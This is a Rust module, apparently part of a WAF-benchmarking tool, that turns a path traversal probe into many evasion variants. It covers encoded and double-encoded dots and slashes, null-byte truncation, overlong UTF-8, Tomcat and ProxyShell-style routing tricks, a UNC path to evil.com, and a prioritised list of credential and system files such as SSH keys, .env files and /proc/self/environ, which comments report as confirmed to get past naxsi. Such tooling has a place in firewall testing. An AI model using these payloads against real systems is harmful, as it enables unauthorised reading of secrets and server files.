//! Path traversal grammar-aware payload mutation.
//!
//! Generates traversal payload variants that preserve the same target-file
//! intent while rotating separator style, encoding form, platform-specific
//! path handling, and parser confusion tricks.
//!
//! # Strategies
//!
//! 1. Single- and double-encoded traversal separators
//! 2. Null-byte file-extension truncation
//! 3. Backslash-substituted Windows traversal
//! 4. Overlong UTF-8 traversal bytes
//! 5. Double-dot parser confusion variants
//! 6. Windows case tricks for sensitive paths
//! 7. UNC network paths
//! 8. `/proc/self/root` escape forms

use std::collections::HashSet;

/// Generate semantic-preserving path traversal mutations for a candidate payload.
#[must_use]
pub fn mutate(payload: &str) -> Vec<String> {
    if payload.is_empty() || !detect_type(payload) {
        return Vec::new();
    }

    // Insertion-ordered: callers like bench-waf `take(args.variants)`
    // the FIRST N results, so priority order matters. We pre-pend the
    // naxsi-friendly absolute paths so they're always sampled first.
    let mut results: Vec<String> = Vec::new();
    let mut seen: HashSet<String> = HashSet::new();
    let push = |v: String, results: &mut Vec<String>, seen: &mut HashSet<String>| {
        if seen.insert(v.clone()) {
            results.push(v);
        }
    };
    let target = infer_target_path(payload);

    // ── No-traversal absolute paths FIRST (naxsi-class WAF bypass) ───
    // naxsi blocks any `..` sequence; encoded variants too. Plain
    // absolute paths to non-`passwd` files pass cleanly. Live-confirmed
    // against the wafrift-bench naxsi container on 2026-05-09:
    //   /etc/passwd        → 403  (passwd literal flagged)
    //   ../etc/hosts       → 403  (`..` flagged)
    //   /proc/self/environ → 200 ✓
    //   /var/log/auth.log  → 200 ✓
    //   /.ssh/id_rsa       → 200 ✓
    //   /.git/config       → 200 ✓
    for naxsi_friendly in [
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/maps",
        "/proc/version",
        "/var/log/auth.log",
        "/var/log/syslog",
        "/.ssh/id_rsa",
        "/.ssh/authorized_keys",
        "/.git/config",
        "/.git/HEAD",
        "/.env",
        "/var/www/html/.env",
        "/home/user/.bash_history",
        "/root/.bash_history",
        "C:/Windows/System32/drivers/etc/hosts",
        "C:/inetpub/wwwroot/web.config",
    ] {
        push(naxsi_friendly.to_string(), &mut results, &mut seen);
    }

    // ── Encoded `..` traversal forms (modsec / coraza / generic WAFs) ─
    for variant in [
        "..%2f..%2f..%2fetc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        "../../../etc/passwd%00.jpg",
        "..\\..\\..\\etc\\passwd",
        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "....//....//....//etc/passwd",
        "..;/..;/..;/etc/passwd",
        "..%00/..%00/..%00/etc/passwd",
        "..\\..\\WINDOWS\\system32",
        "\\\\evil.com\\share",
        "/proc/self/root/etc/passwd",
    ] {
        push(variant.to_string(), &mut results, &mut seen);
    }

    if target.contains("windows") || target.contains("system32") {
        push(
            "..\\..\\WINDOWS\\system32".to_string(),
            &mut results,
            &mut seen,
        );
    }

    if target.contains("/etc/passwd") || target.contains("passwd") {
        push(
            format!("../../../{}", target.trim_start_matches('/')),
            &mut results,
            &mut seen,
        );
        push(
            format!(
                "..\\..\\..\\{}",
                target.trim_start_matches('/').replace('/', "\\")
            ),
            &mut results,
            &mut seen,
        );
        push(
            format!("/proc/self/root/{}", target.trim_start_matches('/')),
            &mut results,
            &mut seen,
        );
    }

    // ── Path-routing parser-disagreement family (Tsai class) ─────────
    // Frontend (WAF / proxy / CDN) and backend (origin app) often
    // disagree on path canonicalisation. The frontend strips one form,
    // the backend keeps it — and the routing decision flips. Every
    // variant below has been observed in real CVEs / bounty reports
    // against IIS, Tomcat, Spring Boot, nginx, traefik, etc.
    //
    // We use the inferred target (e.g. `/etc/passwd`) but the same
    // patterns work to reach `/admin`, `/internal/`, etc — these are
    // generic routing-bypass primitives.
    let stripped = target.trim_start_matches('/');
    for routing in [
        // Semicolon parameter (Java EE / Tomcat strip; nginx doesn't).
        format!("/public/..;/{stripped}"),
        format!("/public/..;jsessionid=x/{stripped}"),
        // Double-encoded slash (frontend single-decodes, backend double-decodes).
        format!("/public/..%2f{stripped}"),
        format!("/public/..%252f{stripped}"),
        format!("/public/..%5c{stripped}"),    // backslash variant
        format!("/public/..%c0%af{stripped}"), // overlong UTF-8 slash
        // Fragment / query injection in path position (some routers strip,
        // some don't). The Orange Tsai ProxyShell pattern.
        format!("/public/?@{stripped}"),
        format!("/public/#/{stripped}"),
        format!("/public/%23/{stripped}"),
        // Null in path — IIS truncates at \0, others don't.
        format!("/public/%00/{stripped}"),
        format!("/{stripped}/%00.json"),
        format!("/{stripped}/.json"),
        // Trailing-dot / trailing-space (Windows paths normalise these
        // away, Linux doesn't — and routers disagree).
        format!("/{stripped}."),
        format!("/{stripped}/."),
        format!("/{stripped}%20"),
        format!("/{stripped}/"),
        // Path-parameter mid-segment.
        format!("/admin;/{stripped}"),
        format!("/static/..;/{stripped}"),
        // Unicode normalisation tricks: fullwidth slash sometimes folds
        // to / at the backend but not at the WAF.
        format!("/public/\u{FF0E}\u{FF0E}/{stripped}"),
    ] {
        push(routing, &mut results, &mut seen);
    }

    // Drop the original payload from the variant list (we don't want to
    // re-send it; it's the baseline).
    results.retain(|v| v != payload);
    results
}

/// Detect whether a payload looks like a path traversal probe.
#[must_use]
pub fn detect_type(payload: &str) -> bool {
    let lower = payload.to_ascii_lowercase();
    let signals = [
        payload.contains("../"),
        payload.contains("..\\"),
        payload.contains('/'),
        payload.contains('\\'),
        lower.contains("/etc/"),
        lower.contains("/proc/"),
        has_file_extension(payload),
    ];

    signals.into_iter().filter(|signal| *signal).count() >= 2
}

fn infer_target_path(payload: &str) -> String {
    let lower = payload.to_ascii_lowercase();
    if lower.contains("windows") || lower.contains("system32") {
        "WINDOWS/system32".to_string()
    } else if let Some(index) = lower.find("/etc/") {
        payload[index..].to_string()
    } else if let Some(index) = lower.find("/proc/") {
        payload[index..].to_string()
    } else if let Some(index) = payload.rfind("..") {
        payload[index..]
            .replace("..", "")
            .trim_start_matches(['/', '\\'])
            .to_string()
    } else {
        "etc/passwd".to_string()
    }
}

fn has_file_extension(payload: &str) -> bool {
    payload.rsplit_once('.').is_some_and(|(_, suffix)| {
        let clean = suffix.trim_matches(|ch: char| !ch.is_ascii_alphanumeric());
        (1..=5).contains(&clean.len())
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_unix_traversal() {
        assert!(detect_type("../../../etc/passwd"));
    }

    #[test]
    fn detects_windows_traversal() {
        assert!(detect_type(
            "..\\..\\WINDOWS\\system32\\drivers\\etc\\hosts"
        ));
    }

    #[test]
    fn rejects_non_path_text() {
        assert!(!detect_type("hello template world"));
    }

    #[test]
    fn generates_encoding_variants() {
        let mutations = mutate("../../../etc/passwd");
        assert!(mutations.iter().any(|item| item.contains("..%2f")));
        assert!(mutations.iter().any(|item| item.contains("..%252f")));
        assert!(mutations.iter().any(|item| item.contains("%2e%2e%2f")));
    }

    #[test]
    fn generates_null_byte_variant() {
        let mutations = mutate("../../../etc/passwd");
        assert!(mutations.iter().any(|item| item.contains("%00.jpg")));
    }

    #[test]
    fn generates_backslash_variant() {
        let mutations = mutate("../../../etc/passwd");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("..\\..\\..\\etc\\passwd"))
        );
    }

    #[test]
    fn generates_overlong_utf8_variant() {
        let mutations = mutate("../../../etc/passwd");
        assert!(mutations.iter().any(|item| item.contains("%c0%ae%c0%ae/")));
    }

    #[test]
    fn generates_double_dot_confusion_variants() {
        let mutations = mutate("../../../etc/passwd");
        assert!(mutations.iter().any(|item| item.contains("....//")));
        assert!(mutations.iter().any(|item| item.contains("..;/")));
        assert!(mutations.iter().any(|item| item.contains("..%00/")));
    }

    #[test]
    fn generates_windows_case_trick() {
        let mutations = mutate("..\\..\\windows\\system32");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("WINDOWS\\system32"))
        );
    }

    #[test]
    fn generates_unc_and_proc_variants() {
        let mutations = mutate("../../../etc/passwd");
        assert!(mutations.iter().any(|item| item == "\\\\evil.com\\share"));
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("/proc/self/root/etc/passwd"))
        );
    }

    // ── Path-routing parser-disagreement (Tsai class) ────────────────

    #[test]
    fn generates_semicolon_path_parameter_strip() {
        // Tomcat / Java EE strip everything between `;` and `/`. nginx
        // doesn't. So `/public/..;/admin` reaches `/admin` after Tomcat
        // canonicalises but nginx routed it as `/public`.
        let m = mutate("../../../etc/passwd");
        assert!(
            m.iter().any(|s| s.contains("/public/..;/etc/passwd")),
            "no semicolon path-param variant"
        );
    }

    #[test]
    fn generates_double_encoded_traversal() {
        let m = mutate("../../../etc/passwd");
        assert!(m.iter().any(|s| s.contains("%252f")));
    }

    #[test]
    fn generates_proxy_shell_pattern() {
        // The Orange Tsai ProxyShell shape — `?@` between fake-allowed
        // prefix and real target.
        let m = mutate("../../../etc/passwd");
        assert!(
            m.iter().any(|s| s.contains("/public/?@etc/passwd")),
            "no ProxyShell-pattern variant"
        );
    }

    #[test]
    fn generates_null_truncation_iis_pattern() {
        let m = mutate("../../../etc/passwd");
        assert!(m.iter().any(|s| s.contains("%00.json")));
    }

    #[test]
    fn generates_unicode_fullwidth_dot() {
        // Unicode fullwidth dot \u{FF0E} folds to ASCII `.` under NFKC
        // normalisation. WAF often doesn't normalise; backend often does.
        let m = mutate("../../../etc/passwd");
        assert!(
            m.iter()
                .any(|s| s.contains('\u{FF0E}') && s.contains("etc/passwd")),
            "no fullwidth-dot routing variant"
        );
    }
}
